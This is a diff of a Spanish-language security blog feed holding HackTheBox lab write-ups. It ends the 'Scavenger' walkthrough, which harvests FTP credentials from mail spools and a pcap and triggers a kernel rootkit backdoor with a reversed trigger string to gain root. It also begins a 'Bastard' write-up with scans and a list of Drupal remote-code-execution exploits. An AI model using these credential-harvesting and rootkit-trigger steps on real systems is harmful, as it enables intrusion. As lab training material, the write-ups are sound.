+-rw-rw---- 1 root mail 1043 Dec 11  2018 /var/spool/mail/support
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que existe un correo el cual al leerlo obtenemos las credenciales del usuario &lt;code&gt;ib01ftp:YhgRt56_Ta&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat /var/spool/mail/ib01c03
+&amp;gt; From support@ib01.supersechosting.htb Mon Dec 10 21:10:56 2018
+Return-path: &amp;lt;support@ib01.supersechosting.htb&amp;gt;
+Envelope-to: ib01c03@ib01.supersechosting.htb
+Delivery-date: Mon, 10 Dec 2018 21:10:56 +0100
+Received: from support by ib01.supersechosting.htb with local (Exim 4.89)
+	(envelope-from &amp;lt;support@ib01.supersechosting.htb&amp;gt;)
+	id 1gWRtI-0000ZK-8Q
+	for ib01c03@ib01.supersechosting.htb; Mon, 10 Dec 2018 21:10:56 +0100
+To: &amp;lt;ib01c03@ib01.supersechosting.htb&amp;gt;
+Subject: Re: Please help! Site Defaced!
+In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100
+	&amp;lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&amp;gt;
+References: &amp;lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&amp;gt;
+X-Mailer: mail (GNU Mailutils 3.1.1)
+Message-Id: &amp;lt;E1gWRtI-0000ZK-8Q@ib01.supersechosting.htb&amp;gt;
+From: support &amp;lt;support@ib01.supersechosting.htb&amp;gt;
+Date: Mon, 10 Dec 2018 21:10:56 +0100
+X-IMAPbase: 1544472964 2
+Status: O
+X-UID: 1
+
+&amp;gt;&amp;gt; Please we need your help. Our site has been defaced!
+&amp;gt;&amp;gt; What we should do now?
+&amp;gt;&amp;gt;
+&amp;gt;&amp;gt; rentahacker.htb
+
+Hi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs.
+Please check if there is any strange file in your web root and upload it to the ftp server:
+ftp.supersechosting.htb
+user: ib01ftp
+pass: YhgRt56_Ta
+
+Thanks.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como las credenciales estan asociadas a &lt;code&gt;ftp&lt;/code&gt; y el puerto se encuentra abierto probamos a conectarnos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.155
+Connected to 10.10.10.155.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.155:fmiracle): ib01ftp
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+dr-xrwx---    4 1005     1000         4096 Dec 10  2018 incidents
+226 Directory send OK.
+ftp&amp;gt; cd incidents
+250 Directory successfully changed.
+ftp&amp;gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+dr-xrwx---    2 1005     1000         4096 Jan 30  2019 ib01c01
+dr-xrwx---    2 1005     1000         4096 Dec 10  2018 ib01c03
+226 Directory send OK.
+ftp&amp;gt; cd ib01c01
+250 Directory successfully changed.
+ftp&amp;gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-r--rw-r--    1 1005     1000        10427 Dec 10  2018 ib01c01.access.log
+-rw-r--r--    1 1000     1000       835084 Dec 10  2018 ib01c01_incident.pcap
+-r--rw-r--    1 1005     1000          173 Dec 11  2018 notes.txt
+226 Directory send OK.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Al conectarnos vemos un archivo log, una nota y un archivo pcap, los cuales vamos a traernos a nuestra maquina.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; binary on
+200 Switching to Binary mode.
+ftp&amp;gt; prompt off
+Interactive mode off.
+ftp&amp;gt; mget *
+local: ib01c01.access.log remote: ib01c01.access.log
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for ib01c01.access.log (10427 bytes).
+226 Transfer complete.
+10427 bytes received in 0.45 secs (22.5332 kB/s)
+local: ib01c01_incident.pcap remote: ib01c01_incident.pcap
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes).
+226 Transfer complete.
+835084 bytes received in 4.99 secs (163.5452 kB/s)
+local: notes.txt remote: notes.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for notes.txt (173 bytes).
+226 Transfer complete.
+173 bytes received in 0.00 secs (861.9659 kB/s)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;La nota nos da una pista.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat notes.txt
+After checking the logs and the network capture, all points to that the attacker knows valid credentials and abused a recently discovered vuln to gain access to the server!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Analizando la captura con &lt;code&gt;tshark&lt;/code&gt; obtenemos una contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tshark -r ib01c01_incident.pcap -Y &quot;http.request.method==POST&quot; -Tfields -e 'tcp.payload' | xxd -ps -r
+Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.
+POST /admin530o6uisg/index.php?rand=1544475115839 HTTP/1.1
+Host: www.pwnhats.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.pwnhats.htb/admin530o6uisg/index.php?controller=AdminLogin&amp;amp;token=de267fd50b09d00b04cca76ff620b201
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+cache-control: no-cache
+X-Requested-With: XMLHttpRequest
+Content-Length: 195
+ajax=1&amp;amp;token=&amp;amp;controller=AdminLogin&amp;amp;submitLogin=1&amp;amp;passwd=GetYouAH4t%21&amp;amp;email=pwnhats%40pwnhats.htb&amp;amp;redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05bPOST /admin530o6uisg/index.php?controller=AdminCustomerThreads&amp;amp;token=8d8e4db864318da7655c7f2d8175815f HTTP/1.1
+Host: www.pwnhats.htb
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si urldecodeamos la contraseña, obtemos que es equivalente a &lt;code&gt;GetYouAH4t!&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php --interactive
+Interactive mode enabled
+
+php &amp;gt; echo urldecode(&quot;GetYouAH4t%21&quot;);
+GetYouAH4t!
+php &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como el propieatio de la captura era el usuario &lt;code&gt;ib01c01&lt;/code&gt; vamos a conectarnos con ese usuario haciendo uso de la credencial obtenida.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.155
+Connected to 10.10.10.155.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.155:fmiracle): ib01c01
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
+-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
+-rw-r-----    1 0        1004           33 Jun 24 00:10 user.txt
+drwxr-xr-x   26 1001     1004         4096 Sep 01  2021 www
+226 Directory send OK.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora proderemos a traernos y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat user.txt
+e8dd26ca8a139f83116a1744aa6d1826
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Si bien examinamos por encima el archivo &lt;code&gt;pcap&lt;/code&gt; con la ayuda de &lt;code&gt;tshark&lt;/code&gt;, vamos a volver a examinarlo esta vez mediante &lt;code&gt;wireshark&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Al abrirnos &lt;code&gt;wireshark&lt;/code&gt;, vemos que en el archivo pcap existen peticiones &lt;code&gt;GET&lt;/code&gt; a un archivo de nombre &lt;code&gt;root.c&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si seguimos el fujo tcp para tratar de ver el contenido, obsevamos todo el script en &lt;code&gt;C&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dentro del script, vemos una cadena &lt;code&gt;Got r00t&lt;/code&gt;, que llama mucho la atención y podemos ponernos a pensar que se trata de un &lt;code&gt;rootkit&lt;/code&gt; y si tratamos de investigar esa cadena del script, vemos un articulo que nos confirma que se trata de un &lt;code&gt;rootkit&lt;/code&gt; y nos dice como podemos aprovecharnos de este.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485&quot;&gt;https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Basicamente lo que hace es cargar un modulo llamado &lt;code&gt;root.ko&lt;/code&gt; y al enviar la cadena &lt;code&gt;echo &quot;g0tR0ot&quot; &amp;gt; /dev/ttyR0; comando&lt;/code&gt;, esta lo ejecutara como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Probamos a ejecutar la cadena, pero vemos que lo ejecutamos como nuestro usuario, y esto quiero pensar que es debido a que si bien el proceso de &lt;code&gt;rootkit&lt;/code&gt; es el mismo, la cadena debe de ser distinta.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap python3 tty_over_http.py
+echo &quot;g0tR0ot&quot; &amp;gt; /dev/ttyR0; whoami
+&amp;gt; ib01c03
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Por ello necesitamos encontrar el &lt;code&gt;root.ko&lt;/code&gt; que en principio es el que carga el &lt;code&gt;rootkit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Si nos volvemos a conectar como el usuario &lt;code&gt;ib01c01&lt;/code&gt;, y listamos los archivo ocultos vemos uno inusual &lt;code&gt;...&lt;/code&gt; y si ingresamos al directorio encontramos el &lt;code&gt;root.ko&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.155
+Connected to 10.10.10.155.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.155:fmiracle): ib01c01
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwx------    4 1001     1004         4096 Sep 01  2021 .
+drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
+drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
+lrwxrwxrwx    1 0        0               9 Sep 01  2021 .bash_history -&amp;gt; /dev/null
+-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
+-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
+-rw-r-----    1 0        1004           33 Jun 24 00:10 user.txt
+drwxr-xr-x   26 1001     1004         4096 Sep 01  2021 www
+226 Directory send OK.
+ftp&amp;gt; cd ...
+250 Directory successfully changed.
+ftp&amp;gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0          399400 Feb 02  2019 root.ko
+226 Directory send OK.
+ftp&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vamos a traernos el archivo y examinarlo con nuestra maquina con &lt;code&gt;radare2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; get root.ko
+local: root.ko remote: root.ko
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for root.ko (399400 bytes).
+226 Transfer complete.
+399400 bytes received in 3.94 secs (98.9888 kB/s)
+ftp&amp;gt; quit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ radare2 root.ko
+Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
+ -- give | and &amp;gt; a try piping and redirection
+[0x08000070]&amp;gt; aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze all functions arguments/locals
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Finding and parsing C++ vtables (avrr)
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information (aanr)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x08000070]&amp;gt; afl
+0x08000070    1 8            sym.root_open
+0x08000080    1 9            sym.root_read
+0x08000090   11 359          sym.root_write
+0x080001f7    7 292          sym.root_init
+0x0800031b    1 82           sym.root_exit
+[0x08000070]&amp;gt; s sym.root_write
+[0x08000090]&amp;gt; pdf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Al examinarlo vemos que la cadena &lt;code&gt;g0tR0ot&lt;/code&gt; fue reemplaza por la cadena en dos partes &lt;code&gt;g3tPr1v&lt;/code&gt;, asi que vamos a probar mandando esta nueva cadena.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap python3 tty_over_http.py
+echo &quot;g3tPr1v&quot; &amp;gt; /dev/ttyR0; whoami
+&amp;gt; root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Esta vez vemos que el &lt;code&gt;rootkit&lt;/code&gt; si funciona, asi que ahora que tenemos privilegios como &lt;code&gt;root&lt;/code&gt; solo nos quedaria visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;echo &quot;g3tPr1v&quot; &amp;gt; /dev/ttyR0; cat /root/root.txt
+&amp;gt; 8c1482a3a42eb925f6e2a6ed49535065
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Fri, 23 Jun 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Scavenger</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Scavenger</guid>
+        
+        <category>Domain Zone Transfer</category>
+        
+        <category>Sql inyection</category>
+        
+        <category>ftp enumaration</category>
+        
+        <category>Whois</category>
+        
+        <category>Pcap analysis</category>
+        
+        <category>rootkit</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Aprende SQL desde cero y dominalo como un experto</title>
@@ -5911,863 +6656,6 @@ cat root.txt
         <category>Docker Breakout</category>
         
         <category>capability sysmodule</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Bastard - htb writeup</title>
-        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina Bastard de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de una versión de &lt;code&gt;Drupal&lt;/code&gt; con la que obtendremos ejecución remota de comandos - &lt;code&gt;esto lo haremos de maneras alternativas&lt;/code&gt;, despues una vez tengamos acceso al sistema usaremos la herramienta &lt;code&gt;sherlock&lt;/code&gt; para realizar un reconocimiento con la que detectaremos una vulnerabilidad asociada a un &lt;code&gt;exploit&lt;/code&gt; con el que nos permita elevar nuestro privilegio para convertirmos en el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Bastard
-❯ ls
- Bastard
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.9
-PING 10.10.10.9 (10.10.10.9) 56(84) bytes of data.
-64 bytes from 10.10.10.9: icmp_seq=1 ttl=127 time=123 ms
-
---- 10.10.10.9 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 123.143/123.143/123.143/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemoscon el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.9 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-29 00:54 GMT
-Initiating SYN Stealth Scan at 00:54
-Scanning 10.10.10.9 [65535 ports]
-Discovered open port 135/tcp on 10.10.10.9
-Discovered open port 80/tcp on 10.10.10.9
-Discovered open port 49154/tcp on 10.10.10.9
-Completed SYN Stealth Scan at 00:54, 26.61s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.9
-Host is up, received user-set (0.13s latency).
-Scanned at 2023-04-29 00:54:22 GMT for 26s
-Not shown: 65532 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT      STATE SERVICE REASON
-80/tcp    open  http    syn-ack ttl 127
-135/tcp   open  msrpc   syn-ack ttl 127
-49154/tcp open  unknown syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 26.71 seconds
-           Raw packets sent: 131085 (5.768MB) | Rcvd: 23 (1.012KB)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a  &lt;code&gt;80 http&lt;/code&gt; , &lt;code&gt;135 rpc&lt;/code&gt; y &lt;code&gt;49154 rpc&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80,135,49154 10.10.10.9 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-29 00:55 GMT
-Nmap scan report for 10.10.10.9
-Host is up (0.18s latency).
-
-PORT      STATE SERVICE VERSION
-80/tcp    open  http    Microsoft IIS httpd 7.5
-| http-robots.txt: 36 disallowed entries (15 shown)
-| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
-|_/LICENSE.txt /MAINTAINERS.txt
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/7.5
-|_http-title: Welcome to Bastard | Bastard
-|_http-generator: Drupal 7 (http://drupal.org)
-135/tcp   open  msrpc   Microsoft Windows RPC
-49154/tcp open  msrpc   Microsoft Windows RPC
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 70.71 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;22&lt;/td&gt;
-      &lt;td&gt;SSH&lt;/td&gt;
-      &lt;td&gt;Microsoft IIS httpd 7.5&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;135&lt;/td&gt;
-      &lt;td&gt;MSRPC&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;49154&lt;/td&gt;
-      &lt;td&gt;MSRPC&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Primeramente ya que &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;80&lt;/code&gt; se encuentra abierto usaremos &lt;code&gt;whatweb&lt;/code&gt; para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.9
-http://10.10.10.9 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a un &lt;code&gt;Drupal 7&lt;/code&gt;, ademas vemos que esta desarrollado en &lt;code&gt;PHP&lt;/code&gt; y &lt;code&gt;ASP.NET&lt;/code&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Drupal: Drupal es un sistema de gestión de contenidos o CMS libre, modular, multipropósito y muy configurable que permite publicar artículos, imágenes, archivos y que también ofrece la posibilidad de otros servicios añadidos como foros, encuestas, votaciones, blogs, administración de usuarios y permisos.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Vamos a proceder a abrir el servicio web en el navegador&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como concretamente vimos que la version de &lt;code&gt;drupal&lt;/code&gt; que esta utilizando corresponde a la version &lt;code&gt;7&lt;/code&gt;, podemos tratar de buscar &lt;code&gt;vulnerablidades&lt;/code&gt; asociadas a esta versión. Para ello usaremos &lt;code&gt;searchsploit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit drupal 7.x
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Drupal 7.x Module Services - Remote Code Execution                                                                                                   | php/webapps/41564.php
-Drupal &amp;lt; 7.34 - Denial of Service                                                                                                                    | php/dos/35415.txt
-Drupal &amp;lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                             | php/webapps/44557.rb
-Drupal &amp;lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                          | php/webapps/44542.txt
-Drupal &amp;lt; 7.58 / &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                  | php/webapps/44449.rb
-Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                              | php/remote/44482.rb
-Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                     | php/webapps/44448.py
-Drupal &amp;lt; 8.5.11 / &amp;lt; 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                | php/remote/46510.rb
-Drupal &amp;lt; 8.6.10 / &amp;lt; 8.5.11 - REST Module Remote Code Execution                                                                                       | php/webapps/46452.txt
-Drupal &amp;lt; 8.6.9 - REST Module Remote Code Execution                                                                                                   | php/webapps/46459.py
-Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                    | php/webapps/44501.txt
-Drupal Module CKEditor &amp;lt; 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                               | php/webapps/25493.txt
-Drupal Module Coder &amp;lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                        | php/remote/40144.php
-Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                    | php/remote/40130.rb
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-Papers: No Results
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos ver varias vulnerabilidades asociadas a la versión que corresponden a &lt;code&gt;RCE (ejecucion remota de comandos)&lt;/code&gt;.Usaremos el primer &lt;code&gt;exploit&lt;/code&gt; que corresponde a uno en &lt;code&gt;php&lt;/code&gt;, para ello vamos a proceder a traernoslo a nuestro directorio de trabajo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -x php/webapps/41564.php
-❯ ls
- 41564.php
